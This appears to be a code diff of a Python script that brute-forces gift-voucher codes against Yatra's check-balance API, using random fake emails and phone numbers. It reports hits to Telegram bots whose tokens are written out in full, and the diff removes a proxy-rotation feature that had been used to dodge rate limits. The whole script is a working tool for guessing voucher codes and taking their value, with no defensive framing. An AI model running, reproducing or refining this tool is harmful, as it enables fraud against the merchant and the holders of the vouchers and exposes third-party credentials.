@@ -25,8 +25,8 @@ def generate_phone():
     return f"9{random.randint(100000000, 999999999)}"
 
 
-def make_post_request(code, email, phone, proxy):
-    """Make a POST request to the Yatra API with the generated code using a proxy."""
+def make_post_request(code, email, phone):
+    """Make a POST request to the Yatra API with the generated code."""
     url = "https://secure.yatra.com/PaySwift/gift-voucher/yatra/dom2/1611240003969/check-balance"
 
     # Custom headers
@@ -58,26 +58,15 @@ def make_post_request(code, email, phone, proxy):
         "mobile": phone,
         "source": "YT",
         "context": "REVIEW",
-        "vouchers": [{
-            "code": code,
-            "type": "PROMO",
-            "pin": ""
-        }]
+        "vouchers": [{"code": code, "type": "PROMO", "pin": ""}],
     }
 
-    # Proxy configuration
-    proxies = {"http": f"http://{proxy}"}
-
     try:
-        response = requests.post(url,
-                                 headers=headers,
-                                 json=payload,
-                                 proxies=proxies,
-                                 timeout=10)
+        response = requests.post(url, headers=headers, json=payload, timeout=10)
         response.raise_for_status()  # Raise HTTPError for bad responses
         return response.json()
     except requests.RequestException as e:
-        print(f"Error during request with proxy {proxy}: {e}")
+        print(f"Error during request: {e}")
         return None
 
 
@@ -92,49 +81,21 @@ def send_to_telegram(api_url, message):
         print(f"Error sending notification to Telegram: {e}")
 
 
-def get_proxies(file_path):
-    """Return a list of proxies read from the specified file."""
-    proxies = []
-    try:
-        with open(file_path, 'r') as file:
-            for line in file:
-                proxy = line.strip()  # Remove any extra spaces or newlines
-                if proxy:  # Ignore empty lines
-                    proxies.append(proxy)
-        if not proxies:
-            print("Warning: No proxies found in the file.")
-    except FileNotFoundError:
-        print(f"Error: The file {file_path} does not exist.")
-    except Exception as e:
-        print(f"Error reading the proxy file: {e}")
-    return proxies
-
-
 def main():
     """Generate and validate voucher codes continuously."""
     valid_code_api = "https://api.telegram.org/bot5443217673:AAG2JGtn3gPGJ8UzKnTW2-l-p4tPt0A2NvQ/sendmessage?chat_id=-1001660096246"
     invalid_code_api = "https://api.telegram.org/bot5453678885:AAGAmj13cf0BrWUuvqNb4Nemc2zFR4IhpTw/sendmessage?chat_id=-871155395"
-
-    proxies_file_path = "proxies.txt"  # Path to the proxy list file
-    proxies = get_proxies(proxies_file_path)
-
-    if not proxies:
-        print("Exiting, as no proxies were loaded.")
-        return
 
     while True:
         code = generate_code()
         email = generate_email()
         phone = generate_phone()
 
-        proxy = random.choice(proxies)  # Pick a random proxy for each request
-
         print(f"Generated code: {code}")
         print(f"Generated email: {email}")
         print(f"Generated phone: {phone}")
-        print(f"Using proxy: {proxy}")
 
-        response = make_post_request(code, email, phone, proxy)
+        response = make_post_request(code, email, phone)
 
         if response:
             print(f"API Response: {json.dumps(response, indent=2)}")
@@ -155,7 +116,7 @@ def main():
                 print(error_message)
                 send_to_telegram(invalid_code_api, error_message)
         else:
-            print(f"No valid response received or request failed with proxy {proxy}.")
+            print("No valid response received or request failed.")
             send_to_telegram(invalid_code_api, "Request failed, no valid response.")
 
         time.sleep(20)  # Delay between iterations to avoid excessive load
